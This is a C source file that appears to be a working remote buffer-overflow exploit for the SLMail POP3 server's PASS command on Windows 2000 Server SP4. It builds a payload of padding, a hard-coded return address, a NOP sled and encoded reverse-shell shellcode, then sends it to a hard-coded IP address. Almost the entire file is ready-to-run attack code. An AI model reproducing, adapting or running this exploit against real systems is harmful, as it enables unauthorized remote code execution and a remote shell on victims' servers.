#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
#define retadd "\x8f\x35\x4a\x5f" /*win2k server sp4 0x773a459f*/
#define port 110

/* revshell العراق القراصنة المجموعة*/
char shellcode[] =
"\xbe\xf7\x94\xd6\xeb\xd9\xca\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x52\x31\x70\x12\x83\xc0\x04\x03\x87\x9a\x34\x1e\x9b\x4b\x3a\xe1\x63\x8c\x5b\x6b\x86\xbd\x5b\x0f\xc3\xee\x6b\x5b\x81\x02\x07\x09\x31\x90\x65\x86\x36\x11\xc3\xf0\x79\xa2\x78\xc0\x18\x20\x83\x15\xfa\x19\x4c\x68\xfb\x5e\xb1\x81\xa9\x37\xbd\x34\x5d\x33\x8b\x84\xd6\x0f\x1d\x8d\x0b\xc7\x1c\xbc\x9a\x53\x47\x1e\x1d\xb7\xf3\x17\x05\xd4\x3e\xe1\xbe\x2e\xb4\xf0\x16\x7f\x35\x5e\x57\x4f\xc4\x9e\x90\x68\x37\xd5\xe8\x8a\xca\xee\x2f\xf0\x10\x7a\xab\x52\xd2\xdc\x17\x62\x37\xba\xdc\x68\xfc\xc8\xba\x6c\x03\x1c\xb1\x89\x88\xa3\x15\x18\xca\x87\xb1\x40\x88\xa6\xe0\x2c\x7f\xd6\xf2\x8e\x20\x72\x79\x22\x34\x0f\x20\x2b\xf9\x22\xda\xab\x95\x35\xa9\x99\x3a\xee\x25\x92\xb3\x28\xb2\xd5\xe9\x8d\x2c\x28\x12\xee\x65\xef\x46\xbe\x1d\xc6\xe6\x55\xdd\xe7\x32\xf9\x8d\x47\xed\xba\x7d\x28\x5d\x53\x97\xa7\x82\x43\x98\x6d\xab\xee\x63\xe6\xde\xe5\x6b\x24\xb6\xfb\x6b\xc9\xfc\x75\x8d\xa3\x12\xd0\x06\x5c\x8a\x79\xdc\xfd\x53\x54\x99\x3e\xdf\x5b\x5e\xf0\x28\x11\x4c\x65\xd9\x6c\x2e\x20\xe6\x5a\x46\xae\x75\x01\x96\xb9\x65\x9e\xc1\xee\x58\xd7\x87\x02\xc2\x41\xb5\xde\x92\xaa\x7d\x05\x67\x34\x7c\xc8\xd3\x12\x6e\x14\xdb\x1e\xda\xc8\x8a\xc8\xb4\xae\x64\xbb\x6e\x79\xda\x15\xe6\xfc\x10\xa6\x70\x01\x7d\x50\x9c\xb0\x28\x25\xa3\x7d\xbd\xa1\xdc\x63\x5d\x4d\x37\x20\x6d\x04\x15\x01\xe6\xc1\xcc\x13\x6b\xf2\x3b\x57\x92\x71\xc9\x28\x61\x69\xb8\x2d\x2d\x2d\x51\x5c\x3e\xd8\x55\xf3\x3f\xc9";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2969);
    memset(buffer, 0x00, 2969);
    char *off = malloc(2607);
    memset(off, 0x00, 2607);
    memset(off, 0x41, 2606);
    char *nop = malloc(9);
    memset(nop, 0x00, 9);
    memset(nop, 0x90, 8);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.25.68");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
